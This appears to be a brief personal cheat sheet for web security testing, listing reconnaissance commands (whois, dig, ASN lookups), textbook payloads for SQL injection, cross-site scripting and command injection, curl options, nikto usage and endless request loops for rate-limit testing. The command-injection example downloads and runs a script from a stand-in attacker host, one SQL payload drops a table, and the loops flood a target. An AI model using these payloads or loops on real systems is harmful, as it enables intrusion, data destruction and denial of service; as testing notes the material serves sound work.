

### BGP
https://ipinfo.io/AS19905
https://bgp.he.net/AS19905


### DNS

dig -t NS 


### Explore Infrastructure

whois <domainname>
dig -t NS <domainname>
dig <domainname>
dig www.domainname
whois <IP address>
IPInfo Search for ASN


### Web Application Attacks

SQL Injection: foo‘ or 1=1;--

SQL Injection: foo‘; drop table students;--

Command Injection: cd /tmp; wget http://evilserver.ru/runme.sh chmod 666 /tmp/runme.sh; bash /tmp/runme.sh; rm /tmp/runme.sh

Cross-Site Scripting: <script>alert(‘xss’);</script>


### Curl Commands

Show what’s going on: -v

Ignore TLS errors: –insecure

Use a different user-agent: -A “Smith User-Agent”

Send a specific header: -H “Referer: https://www.foo.com/”

Don’t show the object: -o /dev/null


### Attack Encoding

https://www.urlencoder.org/


### Honeypots

T-Pot https://github.com/telekom-security/tpotce
dnsenum https://github.com/fwaeytens/dnsenum

### Web Scanning

nikto https://cirt.net/Nikto2
nikto -h <target url>

### Rate Control Testing

one line: while true; do curl -v -o /dev/null  http://foosite.rybolov.net/; done

#!/bin/bash
while true;
do
  wget <target url>;
done
